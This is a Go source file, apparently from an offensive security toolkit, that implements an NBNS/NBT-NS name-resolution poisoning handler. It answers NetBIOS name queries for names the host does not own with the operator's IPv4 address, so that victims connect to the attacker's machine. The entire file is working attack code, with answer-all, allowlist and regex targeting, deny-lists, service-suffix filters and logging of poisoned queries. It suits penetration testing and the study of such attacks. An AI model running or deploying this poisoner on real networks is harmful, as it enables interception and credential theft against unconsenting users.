package nbns

import (
	"encoding/binary"
	"fmt"
	"net"
	"regexp"
	"strings"

	"github.com/TheManticoreProject/Manticore/logger"
)

// MatchMode selects how a SpoofHandler decides whether a queried name should be
// answered with a spoofed address.
type MatchMode int

const (
	// MatchAll answers every queried name (subject to the deny-list). This is the
	// aggressive default an operator uses to poison a whole segment.
	MatchAll MatchMode = iota

	// MatchList answers only names present in the case-insensitive allowlist
	// (SpoofConfig.Names). Any other name is ignored so it can still be resolved
	// by a legitimate responder on the link.
	MatchList

	// MatchRegex answers only names matching the configured regular expression
	// (SpoofConfig.Regex), e.g. `^(WPAD|PROXY)$`.
	MatchRegex
)

// DefaultSpoofTTL is the TTL (in seconds) placed in spoofed answer records when
// no explicit TTL is configured. RFC 1002 does not mandate a value; a short TTL
// keeps a stale poisoned mapping from being cached for long, and 165 seconds is
// a value commonly emitted by NBT-NS responders.
const DefaultSpoofTTL uint32 = 165

// SpoofConfig configures a SpoofHandler.
//
// A SpoofHandler answers NBNS NAME QUERY REQUESTs for names the host does not
// own with an attacker-chosen address, the classic NBT-NS name-resolution
// poisoning primitive used to coerce a victim into connecting to the operator's
// host. Which names are answered is controlled by Mode (answer-all, an exact
// allowlist, or a regex), and the address returned is SpoofIP (typically a local
// interface address so the victim connects back to the operator). It is the
// NetBIOS analogue of the LLMNR SpoofHandler.
type SpoofConfig struct {
	// Mode selects the name-matching strategy (MatchAll, MatchList or MatchRegex).
	Mode MatchMode

	// Names is the case-insensitive allowlist consulted when Mode is MatchList.
	// Entries are compared against the queried name's base label with the
	// service suffix and padding stripped.
	Names []string

	// Regex is the regular expression consulted when Mode is MatchRegex. It is
	// tested against the upper-cased base label of the queried name.
	Regex *regexp.Regexp

	// SpoofIP is the IPv4 address returned in the spoofed NB answer. It is
	// required: the NBNS answer record (ADDR_ENTRY) carries a 4-byte IPv4 address
	// only, so there is no IPv6 counterpart.
	SpoofIP net.IP

	// TTL is the TTL (seconds) placed in the answer record. Zero selects
	// DefaultSpoofTTL.
	TTL uint32

	// Deny is a case-insensitive deny-list of base names that are never answered,
	// even when Mode would otherwise match them. It is the place to suppress the
	// host's own name and benign lookups (e.g. add "WPAD" to opt out of proxy
	// auto-discovery poisoning) so the poisoner can coexist on a segment.
	Deny []string

	// Suffixes, when non-empty, restricts answering to queries whose NetBIOS
	// service suffix (the 16th name byte, RFC 1001 15) is in the set, e.g.
	// {0x00} to poison only workstation lookups or {0x20} for the file-server
	// service. Suffix recovery from a decoded name is best-effort (see
	// spoofNameSuffix); leave empty to answer any suffix.
	Suffixes []byte

	// Verbose logs every query that is answered.
	Verbose bool
}

// SpoofHandler answers matched NBNS NAME QUERY REQUESTs with a spoofed address.
// It is wired into a UDPServer with UDPServer.SetSpoofHandler, where it replaces
// the authoritative name-table lookup for the NAME QUERY opcode; because a
// poisoner answers for names it does not own, no name-table registration is
// required.
type SpoofHandler struct {
	mode     MatchMode
	names    map[string]struct{}
	regex    *regexp.Regexp
	spoofIP  net.IP
	ttl      uint32
	deny     map[string]struct{}
	suffixes map[byte]struct{}
	verbose  bool
}

// NewSpoofHandler builds a SpoofHandler from cfg, validating that the
// configuration can actually answer something.
//
// It returns an error when no usable IPv4 SpoofIP is configured, when MatchList
// is selected with an empty allowlist, or when MatchRegex is selected without a
// compiled regex, so a misconfigured poisoner fails fast instead of silently
// answering nothing.
func NewSpoofHandler(cfg SpoofConfig) (*SpoofHandler, error) {
	ip := cfg.SpoofIP.To4()
	if ip == nil {
		return nil, fmt.Errorf("spoof handler requires an IPv4 SpoofIP")
	}

	h := &SpoofHandler{
		mode:    cfg.Mode,
		regex:   cfg.Regex,
		spoofIP: ip,
		ttl:     cfg.TTL,
		verbose: cfg.Verbose,
	}
	if h.ttl == 0 {
		h.ttl = DefaultSpoofTTL
	}

	switch cfg.Mode {
	case MatchAll:
		// Nothing further to configure.
	case MatchList:
		if len(cfg.Names) == 0 {
			return nil, fmt.Errorf("match mode MatchList requires a non-empty name allowlist")
		}
		h.names = make(map[string]struct{}, len(cfg.Names))
		for _, name := range cfg.Names {
			h.names[normalizeSpoofName(name)] = struct{}{}
		}
	case MatchRegex:
		if cfg.Regex == nil {
			return nil, fmt.Errorf("match mode MatchRegex requires a compiled regex")
		}
	default:
		return nil, fmt.Errorf("unknown match mode %d", cfg.Mode)
	}

	if len(cfg.Deny) > 0 {
		h.deny = make(map[string]struct{}, len(cfg.Deny))
		for _, name := range cfg.Deny {
			h.deny[normalizeSpoofName(name)] = struct{}{}
		}
	}

	if len(cfg.Suffixes) > 0 {
		h.suffixes = make(map[byte]struct{}, len(cfg.Suffixes))
		for _, s := range cfg.Suffixes {
			h.suffixes[s] = struct{}{}
		}
	}

	return h, nil
}

// normalizeSpoofName reduces a NetBIOS name to the case-insensitive base label
// used for matching: it strips the padding the first-level codec leaves in a
// decoded name (trailing NUL bytes, which a 0x00 service suffix survives space
// trimming as, and trailing spaces from the 15-byte space padding / a 0x20
// suffix) and upper-cases the result, since NetBIOS names are conventionally
// upper-cased and compared case-insensitively.
func normalizeSpoofName(name string) string {
	trimmed := strings.TrimRight(name, "\x00")
	trimmed = strings.TrimRight(trimmed, " ")
	return strings.ToUpper(trimmed)
}

// spoofNameSuffix recovers the NetBIOS service suffix (the 16th name byte, RFC
// 1001 15) of a decoded name on a best-effort basis. When the decoded name is a
// full 16 bytes the suffix is its last byte (this covers the 0x00 workstation
// suffix, which survives decoding because a trailing NUL is not space-trimmed).
// When the decoder has trimmed trailing spaces the name is shorter than 16
// bytes, so the missing 16th byte was a space and the suffix is reported as 0x20
// (the server service) — the workstation-vs-service ambiguity inherent in the
// space-trimming decoder.
func spoofNameSuffix(name string) byte {
	if len(name) >= NetBIOSNameLength {
		return name[NetBIOSNameLength-1]
	}
	return ' '
}

// Matches reports whether name should be answered under the handler's match
// mode, deny-list and suffix filter. It is exported to make the matching logic
// directly testable and reusable.
func (h *SpoofHandler) Matches(name string) bool {
	if len(h.suffixes) > 0 {
		if _, ok := h.suffixes[spoofNameSuffix(name)]; !ok {
			return false
		}
	}

	base := normalizeSpoofName(name)

	if h.deny != nil {
		if _, denied := h.deny[base]; denied {
			return false
		}
	}

	switch h.mode {
	case MatchAll:
		return true
	case MatchList:
		_, ok := h.names[base]
		return ok
	case MatchRegex:
		return h.regex != nil && h.regex.MatchString(base)
	default:
		return false
	}
}

// BuildResponse assembles the spoofed positive NAME QUERY RESPONSE for request
// without transmitting it, or returns (nil, false) when the request is not a
// NAME QUERY or no question matched so the caller can stay silent and let
// legitimate resolution proceed.
//
// The response is built per RFC 1002 4.2.13: it echoes the request's transaction
// ID, sets the R (response) and AA (authoritative answer) header flags with B
// clear, copies the RD bit from the request (a B-node echoes the requester's
// recursion-desired bit), and appends a single NB answer resource record whose
// ADDR_ENTRY carries the configured spoof address with the Group bit clear (a
// poisoned name is claimed as a unique owner, RFC 1002 4.2.1.3) and the
// configured TTL. The queried question is echoed into the response; RFC 1002
// 4.2.13 shows QDCOUNT=0, but echoing the question is widely accepted (including
// by this package's own resolver) and keeps the exchange easy to correlate.
func (h *SpoofHandler) BuildResponse(request *NBNSPacket) (*NBNSPacket, bool) {
	if request.Header.Flags&0xF000 != OpNameQuery {
		return nil, false
	}

	for _, q := range request.Questions {
		if q.Type != QuestionTypeNB {
			continue
		}
		if q.Name == nil || !h.Matches(q.Name.Name) {
			continue
		}

		flags := FlagResponse | FlagAuthoritative
		if request.Header.Flags&FlagRecursion != 0 {
			flags |= FlagRecursion
		}

		// NB_FLAGS: a poisoned name is claimed as a unique owner, so the Group (G)
		// bit is clear (RFC 1002 4.2.1.3).
		entry := ADDR_ENTRY{
			Flags:   0,
			Address: binary.BigEndian.Uint32(h.spoofIP),
		}
		rr := NBNSResourceRecord{
			Name:     q.Name,
			Type:     q.Type,
			Class:    q.Class,
			TTL:      h.ttl,
			RDLength: entry.Length(),
			RData:    entry.Marshal(),
		}

		response := &NBNSPacket{
			Header: NBNSHeader{
				TransactionID: request.Header.TransactionID,
				Flags:         flags,
			},
			Questions: []NBNSQuestion{q},
			Answers:   []NBNSResourceRecord{rr},
		}
		response.Header.Questions = uint16(len(response.Questions))
		response.Header.Answers = uint16(len(response.Answers))

		return response, true
	}

	return nil, false
}

// HandleNameQuery builds the spoofed response for a NAME QUERY REQUEST and, when
// verbose, logs the poisoned query. It mirrors the shape of the authoritative
// PacketHandler.handleNameQuery so the UDPServer can invoke it in the same place
// in the dispatch. It returns (response, true) when a name matched and
// (nil, false) when nothing matched, in which case the server stays silent.
func (h *SpoofHandler) HandleNameQuery(remoteAddr net.Addr, request *NBNSPacket) (*NBNSPacket, bool) {
	response, ok := h.BuildResponse(request)
	if !ok {
		return nil, false
	}

	if h.verbose {
		for _, q := range request.Questions {
			if q.Name == nil || q.Type != QuestionTypeNB || !h.Matches(q.Name.Name) {
				continue
			}
			logger.Infof("Poisoned [%s] NBNS query for \"%s\" -> %s", remoteAddr.String(), normalizeSpoofName(q.Name.Name), h.spoofIP.String())
		}
	}

	return response, true
}

// DefaultInterfaceIPv4 returns the IPv4 address of the first non-loopback,
// up interface, a convenience for pointing the poisoner at the operator's own
// address so victims connect back. It is used when SpoofConfig.SpoofIP is not
// set explicitly by the caller.
func DefaultInterfaceIPv4() (net.IP, error) {
	ifaces, err := net.Interfaces()
	if err != nil {
		return nil, fmt.Errorf("failed to enumerate interfaces: %w", err)
	}

	for _, iface := range ifaces {
		if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
			continue
		}
		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}
		for _, addr := range addrs {
			var ip net.IP
			switch v := addr.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			}
			if ip4 := ip.To4(); ip4 != nil {
				return ip4, nil
			}
		}
	}

	return nil, fmt.Errorf("no non-loopback IPv4 interface address found")
}
